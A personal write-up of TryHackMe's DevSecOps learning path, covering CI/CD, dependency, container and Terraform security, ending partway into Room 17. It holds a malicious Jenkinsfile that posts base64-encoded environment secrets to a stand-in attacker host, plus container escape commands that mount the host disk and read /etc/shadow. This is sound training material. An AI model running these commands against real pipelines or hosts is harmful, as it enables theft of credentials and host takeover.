# TryHackMe — DevSecOps Path Writeup

**Platform:** TryHackMe  
**Path:** [DevSecOps](https://tryhackme.com/path/outline/devsecops)  
**Difficulty:** Intermediate  
**Status:** ✅ Completed  
**Profile:** [gresium](https://tryhackme.com/p/gresium)  
**Date Completed:** 2 May 2026  
**Total Rooms:** 18 across 5 sections  
**Estimated Time:** ~27h  

---

## Summary

The DevSecOps path is the most pipeline- and infrastructure-focused path on TryHackMe. It goes deeper than the DevSecOps introduction in the Security Engineer path — here, the pipeline is the target. You learn how CI/CD systems are attacked and defended, how source code repositories are abused, how dependency supply chains are poisoned, and how container and IaC environments are secured. This path is directly relevant to any role touching cloud-native infrastructure, modern software delivery, or platform security.

**Note on overlap:** Several rooms (Introduction to DevSecOps, SSDLC, SAST, Mother's Secret) also appear in the Security Engineer path. These are cross-referenced. All new rooms are written in full.

---

---

## Section 1 — Secure Software Development

> Goal: Understand DevSecOps foundations, the traditional and secure SDLC, and how security integrates into development culture.

---

### Room 1 — Introduction to DevSecOps
🔗 https://tryhackme.com/room/introductiontodevsecops  
*→ Also in Security Engineer path, Room 25. Full notes there.*

**Quick Reference:**
- DevOps = Development + Operations — frequent integration, automated deployment
- DevSecOps = DevOps + Security — security at every pipeline stage
- Shift Left: integrate security early — cheaper than post-production fixes
- CI/CD: Continuous Integration (frequent code merging + automated tests) / Continuous Deployment (automated release)
- Key tools: Git (source control), Jenkins/GitLab CI/GitHub Actions (CI/CD), Docker/Kubernetes (containers), Terraform (IaC)

---

### Room 2 — SDLC
🔗 https://tryhackme.com/room/sdlc

**Key Concepts:**
- SDLC (Software Development Lifecycle): structured process for planning, creating, testing, and deploying software
- Traditional SDLC phases: Planning → Requirements → Design → Implementation → Testing → Deployment → Maintenance
- SDLC models:
  - **Waterfall**: sequential phases, each completed before the next — rigid, poor at handling change
  - **Agile**: iterative sprints (2–4 weeks), continuous feedback, flexible to change — dominant in modern development
  - **Spiral**: risk-driven, each loop = planning → risk analysis → engineering → evaluation — good for high-risk projects
  - **DevOps**: continuous everything — integration, delivery, deployment, monitoring — removes the release bottleneck
- Roles in SDLC: developer, QA engineer, system architect, product manager, security engineer
- Security in SDLC: historically added at the end (testing phase) — DevSecOps moves it to every phase

**What I did:**
Compared SDLC models and matched real-world scenarios to the appropriate model (regulated financial system → Spiral, startup feature delivery → Agile, legacy enterprise → Waterfall migration to Agile). Traced how a security vulnerability introduced in the Design phase would cost progressively more to fix as it progressed through each subsequent phase.

**Takeaways:**
Understanding SDLC models matters for security engineers because the model determines where and how security activities can be injected. You can't do continuous SAST in a Waterfall project with quarterly releases — but you can run automated scanning on every commit in an Agile sprint. Knowing the development model shapes how you recommend security controls.

---

### Room 3 — SSDLC
🔗 https://tryhackme.com/room/securesdlc  
*→ Also in Security Engineer path, Room 21. Full notes there.*

**Quick Reference:**
- SSDLC = SDLC + security at every phase
- Security activities by phase: abuse cases (Requirements), threat modelling (Design), SCA + secure code review (Development), SAST/DAST/pentest (Testing), hardened config + secrets management (Deployment)
- Shift Left: security earlier = exponentially cheaper
- Security Champions: developers with security training embedded per team

---

---

## Section 2 — Security of the Pipeline

> Goal: Understand how CI/CD pipelines are built, where they are vulnerable, and how to secure them.

---

### Room 4 — Intro to Pipeline Automation
🔗 https://tryhackme.com/room/introtopipelineautomation

**Key Concepts:**
- CI/CD pipeline: automated workflow from code commit to production deployment
- Pipeline stages: Source (git push) → Build (compile/package) → Test (unit, integration, security) → Deploy (staging → production)
- Common CI/CD platforms: Jenkins, GitLab CI/CD, GitHub Actions, CircleCI, Azure DevOps, TeamCity
- Pipeline components:
  - **Runners/Agents**: machines that execute pipeline jobs — can be shared or dedicated
  - **Pipeline-as-code**: `.gitlab-ci.yml`, `Jenkinsfile`, `.github/workflows/*.yml` — stored in the repository
  - **Artifacts**: outputs of build steps — packages, Docker images, binaries — stored and passed between stages
  - **Secrets/Variables**: credentials injected into pipeline jobs — must never be hardcoded in pipeline config
- Attack surface: the pipeline is high-value — compromise it and you can inject code into every release

**What I did:**
Reviewed and wrote pipeline configurations for GitLab CI/CD and GitHub Actions. Traced the full lifecycle of a code change from `git push` through CI tests, Docker image build, security scan, and staging deployment. Identified the attack surface at each stage — repository access, runner compromise, artifact tampering, secret leakage.

```yaml
# GitHub Actions pipeline with security stages
name: Secure CI/CD Pipeline
on: [push, pull_request]

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run Semgrep SAST
        run: |
          pip install semgrep
          semgrep --config=p/owasp-top-ten --error .

  sca:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Dependency audit
        run: npm audit --audit-level=high

  build-and-scan:
    needs: [sast, sca]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .
      - name: Trivy image scan
        run: trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:${{ github.sha }}

  deploy-staging:
    needs: build-and-scan
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Deploy to staging
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}   # injected from secrets store
        run: ./deploy.sh staging
```

**Takeaways:**
The pipeline is the single point through which all code reaches production — compromising it is more valuable to an attacker than compromising any individual application. Secrets hardcoded in pipeline configs are exposed to anyone who can read the repository. CI/CD runners with broad network access and excessive permissions are prime targets — a compromised runner can exfiltrate secrets, tamper with artifacts, and deploy malicious code.

---

### Room 5 — Source Code Security
🔗 https://tryhackme.com/room/sourcecodesecurity

**Key Concepts:**
- Source code repository: the origin of everything — GitHub, GitLab, Bitbucket
- Repository security risks:
  - Hardcoded secrets: API keys, passwords, tokens committed to git — visible to everyone with access and permanent in git history
  - Overly permissive access: public repositories, excessive member permissions, no branch protection
  - Dependency confusion: attacker publishes a malicious package with the same name as an internal one on a public registry
  - Typosquatting: malicious packages with names similar to popular ones — `lodsh` instead of `lodash`
  - Malicious PRs: attackers submit contributions containing backdoors — supply chain attack
- Secret scanning: `truffleHog`, `detect-secrets`, `git-secrets`, GitHub native secret scanning
- Branch protection: require PR reviews, require CI to pass, restrict who can push to main
- Signed commits: GPG-signed commits verify the committer's identity — prevents impersonation

**What I did:**
Scanned a git repository's history for hardcoded secrets using `truffleHog` — found an AWS access key committed 47 commits ago (long since "deleted" from the latest version but still present in history). Configured branch protection rules requiring 2 approvals and passing CI before merge. Set up pre-commit hooks with `detect-secrets` to prevent secrets from entering commits. Researched and documented a dependency confusion attack scenario.

```bash
# Scan git history for secrets (finds deleted secrets too)
pip install trufflehog
trufflehog git https://github.com/target/repo.git --json > secrets.json
trufflehog git file://./local-repo --since-commit HEAD~100

# Local secret scanning with detect-secrets
pip install detect-secrets
detect-secrets scan > .secrets.baseline
detect-secrets audit .secrets.baseline

# Pre-commit hook setup
pip install pre-commit
cat > .pre-commit-config.yaml << 'EOF'
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
EOF
pre-commit install

# Check git log for suspicious commits
git log --all --oneline | head -50
git show <commit_hash>    # inspect specific commit
git log --all -p -- "*.env" "*.config" "*credentials*"   # find credential files in history
```

**Takeaways:**
`git history is permanent` — deleting a file in a new commit does not remove it from history. Any secret committed to git, even for a single commit that was immediately reverted, must be treated as compromised and rotated. `truffleHog` scanning full history frequently finds credentials committed months or years ago that the team forgot about but attackers will find.

---

### Room 6 — CI/CD and Build Security
🔗 https://tryhackme.com/room/cicdandbuildsecurity

**Key Concepts:**
- CI/CD attack surface: attacker who compromises the build pipeline can inject malicious code into every artifact
- **Build system attacks**: malicious Jenkinsfile, compromised `.github/workflows`, poisoned build scripts
- **Runner compromise**: CI runners with excessive permissions, shared runners executing malicious jobs, runner token theft
- **Artifact tampering**: unsigned artifacts can be replaced between build and deploy — no integrity check
- **Environment variable leakage**: secrets in env vars printed to logs, exposed via `env` command in scripts
- **Dependency poisoning**: malicious packages pulled during build — lockfiles prevent version drift
- Securing CI/CD:
  - Pin dependency versions with lockfiles (`package-lock.json`, `Pipfile.lock`, `poetry.lock`)
  - Sign and verify artifacts (Sigstore/cosign for containers)
  - Use dedicated runners per project — never share runners between untrusted projects
  - Minimal runner permissions — least privilege for the service account
  - Audit pipeline configs in code review — treat `Jenkinsfile` changes like production code

**What I did:**
Attacked a vulnerable CI/CD pipeline — exploited a malicious `Jenkinsfile` that was merged via a PR, which ran on the CI runner and exfiltrated environment variables (including `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`) to an external endpoint. Also demonstrated a compromised GitHub Actions workflow that printed all secrets to the build log. Then hardened the pipeline: added pipeline config reviews to the PR checklist, enforced secret masking, restricted runner permissions.

```groovy
// Malicious Jenkinsfile - exfiltrates CI secrets
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                sh 'curl -X POST http://attacker.thm/exfil -d "$(env | base64)"'
            }
        }
    }
}
```

```yaml
# Secure GitHub Actions - no secret leakage
- name: Deploy
  env:
    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  run: |
    # Secrets are masked in logs automatically
    # Never do: echo $AWS_ACCESS_KEY_ID
    aws s3 sync ./dist s3://mybucket/
```

```bash
# Verify container image signature (cosign)
cosign verify --certificate-identity=ci@org.com \
  --certificate-oidc-issuer=https://accounts.google.com \
  myapp:latest

# Sign artifact
cosign sign --key cosign.key myapp:latest
```

**Takeaways:**
The SolarWinds attack was a CI/CD compromise at scale — attackers modified the build process to inject a backdoor into legitimate software that was then distributed to 18,000+ customers. Treating pipeline configuration files (`Jenkinsfile`, `.github/workflows/*.yml`) as equally sensitive as production code — with mandatory review, change tracking, and access control — is the core CI/CD security principle.

---

---

## Section 3 — Security in the Pipeline

> Goal: Apply security scanning tools inside the pipeline — dependency management, SAST, DAST, and code analysis.

---

### Room 7 — Dependency Management
🔗 https://tryhackme.com/room/dependencymanagement

**Key Concepts:**
- Modern applications depend on hundreds of third-party packages — each is a potential vulnerability source
- Supply chain attack: compromise a widely-used dependency → affect every application that uses it (Log4Shell, XZ Utils backdoor)
- Dependency confusion attack: publish a malicious package with the same name as an internal private package to a public registry (npm, PyPI) — package managers pull public over private
- Typosquatting: register near-identical package names to popular libraries — `requets` instead of `requests`
- SCA (Software Composition Analysis): scan dependencies for known CVEs — `npm audit`, `pip-audit`, `bundler-audit`, OWASP Dependency-Check, Snyk, Socket
- Lockfiles: `package-lock.json`, `Pipfile.lock`, `poetry.lock`, `Cargo.lock` — pin exact versions and hashes, prevent unexpected updates
- Version pinning: specify exact versions, not ranges — `lodash@4.17.21` not `lodash@^4`
- SBOM (Software Bill of Materials): formal inventory of all dependencies — required by US Executive Order on cybersecurity

**What I did:**
Ran `npm audit` and OWASP Dependency-Check against a vulnerable Node.js application — found 14 CVEs including a critical prototype pollution in lodash 4.17.4 and a high RCE in a transitive dependency. Generated an SBOM with `syft`. Demonstrated a dependency confusion attack — created a malicious package with the same name as an internal package on npm, confirmed it was pulled during `npm install`. Set up `npm ci` (uses lockfile strictly, no resolution) to replace `npm install`.

```bash
# Dependency vulnerability scanning
npm audit --audit-level=moderate
npm audit fix    # auto-fix where possible

pip install pip-audit
pip-audit -r requirements.txt --output json > audit.json

# OWASP Dependency-Check
dependency-check.sh --project myapp --scan ./ --format HTML --out ./report/

# Snyk (free tier available)
npm install -g snyk
snyk auth && snyk test && snyk monitor

# Generate SBOM
pip install syft
syft dir:. -o spdx-json > sbom.spdx.json
syft myapp:latest -o cyclonedx-json > sbom.cyclonedx.json

# Lockfile enforcement (use ci instead of install)
npm ci    # fails if package-lock.json is missing or inconsistent
pip install --require-hashes -r requirements.txt    # verify hashes

# Check for dependency confusion risk - look for internal package names on public registries
curl https://registry.npmjs.org/@internal/mypackage 2>/dev/null | jq '.name'
```

**Takeaways:**
Log4Shell (CVE-2021-44228) was a dependency vulnerability — millions of applications pulled `log4j-core` as a transitive dependency without knowing it. An SCA tool scanning on every commit would have flagged the vulnerable version the moment the CVE was published. Lockfiles are critical — without them, `npm install` at different times can pull different (potentially malicious) versions. `npm ci` in pipelines strictly enforces the lockfile.

---

### Room 8 — SAST
🔗 https://tryhackme.com/room/sast  
*→ Also in Security Engineer path, Room 22. Full notes there.*

**Quick Reference:**
- SAST: static analysis of source code — runs pre-commit and in CI/CD without executing the app
- Tools: Semgrep (multi-language), Bandit (Python), ESLint security (JS), Brakeman (Rails)
- Common findings: SQL injection via string concat, command injection, hardcoded secrets, weak crypto
- CI integration: block PRs on critical/high findings

```bash
semgrep --config=p/owasp-top-ten --config=p/secrets --error .
bandit -r ./app/ -f json -o results.json -l
```

---

### Room 9 — DAST
🔗 https://tryhackme.com/room/dastzap

**Key Concepts:**
- DAST: Dynamic Application Security Testing — test a running application by sending attack traffic
- OWASP ZAP (Zed Attack Proxy): the primary open-source DAST tool — both GUI and CLI/Docker
- ZAP scan modes:
  - **Baseline scan**: passive only — safe for production, finds misconfigurations and obvious issues
  - **Full scan**: active attack payloads — run against staging only, will generate attack traffic
  - **API scan**: OpenAPI/Swagger spec driven — systematic coverage of all API endpoints
- ZAP automation framework: `zap.yaml` automation config — reproducible, pipeline-integrated scans
- Authentication: ZAP can authenticate via form login, HTTP auth, or session cookie injection
- False positive management: ZAP context files define scope and suppress known false positives

**What I did:**
Ran ZAP in all three modes against a staging web application. Configured authentication so ZAP could scan authenticated pages. Set up ZAP automation framework with a `zap.yaml` config that runs on every staging deployment. Found: reflected XSS in a search parameter, SQL injection in a filter parameter, missing Content-Security-Policy and X-Frame-Options headers, and a clickjacking vulnerability. Generated HTML and JSON reports.

```bash
# ZAP Docker - baseline (passive, CI-safe on production)
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://staging.target.thm \
  -r zap_baseline_report.html \
  -J zap_baseline_results.json

# ZAP Docker - full active scan (staging only)
docker run -t owasp/zap2docker-stable zap-full-scan.py \
  -t https://staging.target.thm \
  -r zap_full_report.html \
  -J zap_full_results.json \
  -z "-config scanner.attackStrength=HIGH"

# ZAP API scan from OpenAPI spec
docker run -t owasp/zap2docker-stable zap-api-scan.py \
  -t https://staging.target.thm/api/openapi.json \
  -f openapi \
  -r zap_api_report.html

# ZAP Automation Framework (pipeline integration)
cat > zap.yaml << 'EOF'
env:
  contexts:
    - name: "Target"
      urls: ["https://staging.target.thm"]
      authentication:
        method: "form"
        parameters:
          loginUrl: "https://staging.target.thm/login"
          loginRequestData: "username={%username%}&password={%password%}"
jobs:
  - type: passiveScan-wait
  - type: activeScan
    parameters:
      maxRuleDurationInMins: 5
  - type: report
    parameters:
      reportFile: "zap-report"
      reportDir: "/tmp/"
EOF
docker run -v $(pwd):/zap/wrk owasp/zap2docker-stable zap.sh -cmd -autorun /zap/wrk/zap.yaml
```

**Takeaways:**
ZAP baseline scan (passive) is safe to run against production daily — it observes and flags misconfigurations without sending attack traffic. The full active scan belongs in the staging pipeline as a deployment gate — critical and high findings should block promotion to production. API scanning with an OpenAPI spec gives systematic coverage of every endpoint including those not reachable via spider.

---

### Room 10 — Mother's Secret
🔗 https://tryhackme.com/room/codeanalysis  
*→ Also in Security Engineer path, Room 26. Full notes there.*

**Quick Reference:**
- Manual code review capstone — trace user input through to dangerous sinks
- Found: hardcoded credentials in config.py, `pickle.loads()` on user cookie (RCE), path traversal in file download
- `pickle.loads()` on user input = arbitrary code execution

---

---

## Section 4 — Container Security

> Goal: Understand containerisation from fundamentals through to vulnerability exploitation and hardening.

---

### Room 11 — Intro to Containerisation
🔗 https://tryhackme.com/room/introtocontainerisation

**Key Concepts:**
- Containerisation: packaging an application with all its dependencies into a portable, isolated unit
- Container vs VM: containers share the host kernel (isolated via namespaces/cgroups), VMs have their own kernel — containers are lighter, VMs have stronger isolation
- Linux kernel features enabling containers:
  - **Namespaces**: isolate the container's view of the system — PID, network, mount, UTS, IPC, user namespaces
  - **cgroups** (control groups): limit and account for resource usage — CPU, memory, I/O per container
  - **UnionFS**: layered filesystem — each Dockerfile instruction creates a new layer — layers are cached and shared
- Container images: immutable snapshot of the filesystem — pulled from registries (Docker Hub, ECR, GCR, GHCR)
- OCI (Open Container Initiative): open standard for container images and runtimes — ensures portability across tools
- Container runtime: executes containers from images — Docker (containerd + runc), podman, CRI-O (Kubernetes default)

**What I did:**
Traced how a Docker container is created from an image — inspected image layers with `docker history`, examined namespaces used by a running container (`/proc/<pid>/ns`), reviewed cgroup limits applied to a container. Understood why containers are not VMs — the shared kernel means a kernel exploit affects all containers on the host.

```bash
# Inspect image layers
docker history myapp:latest
docker inspect myapp:latest | jq '.[0].RootFS.Layers'

# See container namespaces
docker run -d --name test nginx
PID=$(docker inspect test --format '{{.State.Pid}}')
ls -la /proc/$PID/ns/

# Check cgroup limits
cat /sys/fs/cgroup/memory/docker/<container_id>/memory.limit_in_bytes

# Compare container vs host processes
docker exec test ps aux    # container view
ps aux | grep nginx        # host view - same PIDs visible
```

**Takeaways:**
Containers share the host kernel — this is both their strength (performance) and their weakness (security boundary). A kernel vulnerability exploitable from inside a container can potentially escape to the host. Understanding namespaces explains why containers cannot see each other's processes by default — PID namespace isolation — and why misconfigured privileged containers can see everything.

---

### Room 12 — Intro to Docker
🔗 https://tryhackme.com/room/introtodockerk8pdqk

**Key Concepts:**
- Docker architecture: Docker CLI → Docker daemon (dockerd) → containerd → runc
- Dockerfile instructions: `FROM`, `RUN`, `COPY`, `ADD`, `ENV`, `EXPOSE`, `USER`, `WORKDIR`, `ENTRYPOINT`, `CMD`
- Image building: `docker build -t name:tag .` — each instruction creates a layer
- Image registries: Docker Hub, Amazon ECR, Google GCR, GitHub GHCR — push and pull images
- Docker networking: bridge (default — container-to-container), host (shares host network), none (isolated), overlay (multi-host)
- Docker volumes: persistent storage that survives container restart — bind mounts (host path) or named volumes
- Docker Compose: define multi-container applications in `docker-compose.yml` — `docker compose up`
- Security relevant: `--privileged` flag (gives all capabilities), `-v /:/host` (full host filesystem), `--network host` (shares host network stack)

**What I did:**
Built a multi-stage Dockerfile for a Python web app, pushed to a registry, ran with security constraints. Set up a multi-container application with Docker Compose (app + postgres + nginx reverse proxy). Explored how `docker run --privileged` gives the container full access to host devices — equivalent to host root.

```dockerfile
# Multi-stage build - smaller, more secure final image
FROM python:3.11-slim AS builder
WORKDIR /build
COPY requirements.txt .
RUN pip install --user --no-cache-dir -r requirements.txt

FROM python:3.11-slim
RUN adduser --disabled-password --no-create-home appuser
COPY --from=builder /root/.local /home/appuser/.local
COPY --chown=appuser:appuser app/ /app/
USER appuser
WORKDIR /app
EXPOSE 8000
CMD ["python", "-m", "uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

```bash
# Build and push
docker build -t myapp:1.0.0 .
docker tag myapp:1.0.0 ghcr.io/gresium/myapp:1.0.0
docker push ghcr.io/gresium/myapp:1.0.0

# Run securely
docker run -d \
  --name myapp \
  --user 1000:1000 \
  --read-only \
  --tmpfs /tmp \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  -p 127.0.0.1:8000:8000 \
  myapp:1.0.0

# Dangerous flags to avoid
docker run --privileged ...         # gives ALL capabilities - avoid
docker run -v /:/host ...           # mounts full host filesystem - critical risk
docker run --network host ...       # shares host network stack - avoid
docker run -v /var/run/docker.sock  # root on host - critical risk
```

**Takeaways:**
Multi-stage builds are the single most impactful Dockerfile improvement — they separate the build environment (with compilers, dev tools, and build secrets) from the runtime image (which should have only what's needed to run). The final image has a dramatically smaller attack surface. `--privileged` should never appear in production — it gives the container every Linux capability and bypasses all security boundaries.

---

### Room 13 — Intro to Kubernetes
🔗 https://tryhackme.com/room/introtok8s

**Key Concepts:**
- Kubernetes (K8s): container orchestration — schedules, scales, and manages containers across a cluster
- Core components:
  - **Control Plane**: API Server (all requests go through here), etcd (cluster state database), Scheduler (assigns pods to nodes), Controller Manager
  - **Worker Nodes**: kubelet (runs pods), kube-proxy (networking), container runtime (containerd)
- Key objects:
  - **Pod**: smallest deployable unit — one or more containers sharing network and storage
  - **Deployment**: manages replica sets — rolling updates, rollbacks
  - **Service**: stable network endpoint for a set of pods — ClusterIP, NodePort, LoadBalancer
  - **ConfigMap**: non-sensitive configuration — mounted as env vars or files
  - **Secret**: sensitive data (base64 encoded, NOT encrypted by default) — requires encryption at rest configuration
  - **Namespace**: virtual cluster — isolates resources
- Security relevant: RBAC (who can do what via API), Network Policies (pod-to-pod traffic), Pod Security Standards, Service Accounts

**What I did:**
Deployed a web application to Kubernetes — wrote Deployment, Service, and ConfigMap manifests. Debugged pod scheduling issues. Explored RBAC — viewed ClusterRoles and RoleBindings. Discovered that Kubernetes Secrets are only base64 encoded, not encrypted — decoded a secret from etcd to demonstrate. Set up encryption at rest for Secrets.

```yaml
# Deployment manifest
apiVersion: apps/v1
kind: Deployment
metadata:
  name: webapp
  namespace: production
spec:
  replicas: 3
  selector:
    matchLabels:
      app: webapp
  template:
    metadata:
      labels:
        app: webapp
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 1000
      containers:
      - name: webapp
        image: ghcr.io/gresium/myapp:1.0.0
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop: ["ALL"]
        resources:
          limits:
            memory: "128Mi"
            cpu: "500m"
        env:
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: db-secret
              key: password
```

```bash
# Explore the cluster
kubectl get all -n production
kubectl describe pod webapp-xxx -n production
kubectl logs webapp-xxx -n production

# RBAC inspection
kubectl get clusterroles | grep -v system
kubectl get rolebindings -n production -o yaml

# Secret is only base64 - not encrypted
kubectl get secret db-secret -o jsonpath='{.data.password}' | base64 -d

# Check pod security context
kubectl get pod webapp-xxx -o jsonpath='{.spec.securityContext}'
```

**Takeaways:**
Kubernetes Secrets are base64-encoded, not encrypted — anyone with etcd access or `kubectl get secret` rights can read them in plaintext. Encryption at rest using a KMS provider is required to protect secrets in etcd. RBAC misconfiguration is the most common Kubernetes security finding — overly broad ClusterRoleBindings giving `pods/exec` or wildcard permissions are found in most cluster audits.

---

### Room 14 — Container Vulnerabilities
🔗 https://tryhackme.com/room/containervulnerabilitiesDG

**Key Concepts:**
- Container escape: breaking out of the container isolation to access the host
- Common escape vectors:
  - **Privileged containers**: `--privileged` gives all Linux capabilities + host device access → mount host filesystem → chroot to host
  - **Docker socket mount**: `/var/run/docker.sock` inside container → create new privileged container → escape
  - **Writable host path mount**: `-v /etc:/host/etc` → modify host files from inside container
  - **Kernel exploits**: shared kernel means kernel CVEs affect all containers — runc CVE-2019-5736 (Runc escape)
  - **Capabilities abuse**: individual capabilities are dangerous even without full privilege — `CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_PTRACE`
- Image vulnerabilities: CVEs in base image packages — Trivy, Grype scan images
- Misconfigured securityContext: `runAsRoot: true`, `allowPrivilegeEscalation: true`, no `readOnlyRootFilesystem`

**What I did:**
Performed container escape exercises:

*Privileged container escape:*
```bash
# Inside privileged container
fdisk -l    # see host disks
mkdir /mnt/host
mount /dev/sda1 /mnt/host    # mount host filesystem
chroot /mnt/host /bin/bash   # chroot to host
cat /etc/shadow              # read host password file
```

*Docker socket escape:*
```bash
# Inside container with /var/run/docker.sock mounted
apt install docker.io -y
docker run -it -v /:/host ubuntu chroot /host /bin/bash
# Now running as root on the host
```

*Capability abuse (CAP_SYS_ADMIN):*
```bash
# Inside container with CAP_SYS_ADMIN
mount -t cgroup -o rdma cgroup /tmp/cgroup
mkdir /tmp/cgroup/x
echo 1 > /tmp/cgroup/x/notify_on_release
# ... (cgroup release agent escape technique)
```

**Takeaways:**
Container escape is a real and well-documented attack class — not theoretical. The Docker socket is the most common production misconfiguration enabling escape. Privileged containers should be treated as if they are running directly on the host — with full root access. Security scanning tools like Trivy detect vulnerable image CVEs but cannot detect runtime misconfigurations — use `kubeaudit` or `kube-bench` for runtime security posture.

---

### Room 15 — Container Hardening
🔗 https://tryhackme.com/room/containerhardening

**Key Concepts:**
- Hardening layers: image (Dockerfile), runtime (docker run flags / K8s securityContext), orchestration (RBAC, Network Policies), host (kernel hardening)
- Dockerfile hardening:
  - Use minimal base images (distroless, alpine, scratch)
  - Run as non-root user (`USER 1000`)
  - Multi-stage builds — exclude build tools from final image
  - Pin image digests, not just tags — `FROM python:3.11-slim@sha256:abc123`
  - Scan with Trivy in CI — fail build on HIGH/CRITICAL
- Runtime hardening:
  - `--read-only`: read-only root filesystem
  - `--cap-drop ALL`: drop all capabilities, add only required
  - `--security-opt no-new-privileges`: prevent privilege escalation
  - `--security-opt seccomp=profile.json`: restrict allowed syscalls
  - Resource limits: `--memory 128m --cpus 0.5`
- Kubernetes Pod Security Standards: Restricted (most secure), Baseline, Privileged
- AppArmor/Seccomp profiles: reduce available syscalls to the minimum needed

**What I did:**
Hardened a series of containers progressively — each stage applied additional controls and measured the resulting attack surface reduction. Applied a custom seccomp profile to a container that blocked all syscalls except those listed in the allowlist. Applied a Kubernetes Pod Security Standard to a namespace — all pods violating Restricted policy were rejected. Scanned all images with Trivy and rebuilt with updated base images until zero HIGH/CRITICAL CVEs remained.

```dockerfile
# Maximally hardened Dockerfile
FROM python:3.11-slim@sha256:exact_digest AS builder
WORKDIR /build
COPY requirements.txt .
RUN pip install --user --no-cache-dir -r requirements.txt

FROM gcr.io/distroless/python3-debian12@sha256:exact_digest
COPY --from=builder /root/.local /home/nonroot/.local
COPY --chown=nonroot:nonroot app/ /app/
USER nonroot
WORKDIR /app
EXPOSE 8080
ENTRYPOINT ["/usr/bin/python3", "main.py"]
```

```bash
# Runtime hardening
docker run -d \
  --name hardened-app \
  --user 65534:65534 \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=64m \
  --cap-drop ALL \
  --security-opt no-new-privileges=true \
  --security-opt seccomp=seccomp-profile.json \
  --memory 128m \
  --cpus 0.5 \
  --network none \
  myapp:latest

# Kubernetes - enforce Restricted Pod Security Standard
kubectl label namespace production \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted

# Trivy CI integration
trivy image --exit-code 1 \
  --severity HIGH,CRITICAL \
  --ignore-unfixed \
  --format sarif \
  --output trivy-results.sarif \
  myapp:latest

# kube-bench - CIS Kubernetes Benchmark
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs -l app=kube-bench
```

**Takeaways:**
Distroless images have no shell, no package manager, and no system utilities — an attacker who gets code execution inside the container has almost nothing to work with. Seccomp profiles restricting available syscalls prevent many container escape techniques that rely on specific system calls (like `mount`). The combination of distroless + non-root + read-only filesystem + dropped capabilities + seccomp creates a container that is extremely difficult to abuse even after code execution.

---

---

## Section 5 — Infrastructure as Code

> Goal: Understand IaC tools, how they are attacked, and how to secure them.

---

### Room 16 — Intro to IaC
🔗 https://tryhackme.com/room/introtoiac

**Key Concepts:**
- IaC (Infrastructure as Code): manage and provision infrastructure through code and version control — not manual clicks
- Benefits: reproducibility, version history, peer review, automated testing, disaster recovery (rebuild from code)
- IaC tools:
  - **Terraform** (HashiCorp): cloud-agnostic, declarative HCL — most widely used
  - **Pulumi**: IaC using general-purpose languages (Python, TypeScript, Go)
  - **AWS CloudFormation**: AWS-native, JSON/YAML — tightly integrated with AWS
  - **Azure Bicep/ARM Templates**: Azure-native
  - **Ansible**: configuration management + IaC — procedural, agentless, uses YAML playbooks
  - **Vagrant**: VM provisioning for development environments
- Declarative vs imperative: declarative (Terraform — describe desired state, tool figures out how), imperative (Ansible — describe steps to execute)
- State management: Terraform maintains a state file tracking what exists — remote state (S3, Terraform Cloud) is required for team use
- IaC security risks: hardcoded credentials, overly permissive IAM, public exposure of resources, state file containing secrets

**What I did:**
Wrote Terraform configurations to provision AWS infrastructure — EC2 instances, S3 buckets, security groups, and IAM roles. Used Terraform state stored in S3 with DynamoDB locking. Ran `tfsec` and `checkov` against the configuration before `terraform apply` — found hardcoded credentials, security group with `0.0.0.0/0` on all ports, S3 bucket without encryption. Fixed all findings before applying.

```hcl
# Terraform - secure S3 bucket
resource "aws_s3_bucket" "app_data" {
  bucket = "myapp-data-${var.environment}"
}

resource "aws_s3_bucket_server_side_encryption_configuration" "app_data" {
  bucket = aws_s3_bucket.app_data.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
  }
}

resource "aws_s3_bucket_public_access_block" "app_data" {
  bucket                  = aws_s3_bucket.app_data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Use variables and secrets manager - never hardcode credentials
resource "aws_db_instance" "main" {
  password = data.aws_secretsmanager_secret_version.db_password.secret_string
  # NOT: password = "hardcodedpassword123"
}
```

```bash
# Terraform workflow
terraform init
terraform plan    # preview changes
terraform apply   # apply changes
terraform destroy # tear down

# IaC security scanning (BEFORE apply)
tfsec ./    # Aqua Security
checkov -d ./ --framework terraform
terrascan scan -i terraform -d ./

# Remote state (required for teams)
terraform {
  backend "s3" {
    bucket         = "terraform-state-prod"
    key            = "myapp/terraform.tfstate"
    region         = "eu-west-1"
    encrypt        = true
    dynamodb_table = "terraform-state-lock"
  }
}
```

**Takeaways:**
The Terraform state file contains the full configuration of your infrastructure including resource IDs, and often contains sensitive values like database passwords and API keys in plaintext. It must be stored encrypted in remote state (S3 with encryption), never committed to git. IaC scanning before `terraform apply` is the equivalent of SAST for infrastructure — catch public S3 buckets and open security groups before they exist.

---

### Room 17 — On-Premises IaC
🔗 https://tryhackme.com/room/onpremisesiac

**Key Concepts:**
